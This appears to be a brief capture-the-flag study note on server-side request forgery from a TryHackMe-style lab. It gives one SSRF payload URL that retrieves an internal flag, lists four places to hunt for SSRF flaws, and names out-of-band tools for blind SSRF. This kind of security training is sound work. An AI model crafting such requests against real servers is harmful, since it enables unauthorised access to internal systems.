`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=`
```
Flag ID: 9 Found!
THM{SSRF_MASTER}
```

4 places to look for SSRF Vulns
1) When a full URL is used in a parameter in the address bar
2) A hidden flield in a form
3) a partial URL like a hostname
4) only the path of the url

If working with blind SSRF use requestbin.com or own HTTP server or Burp Suite Collaborator client
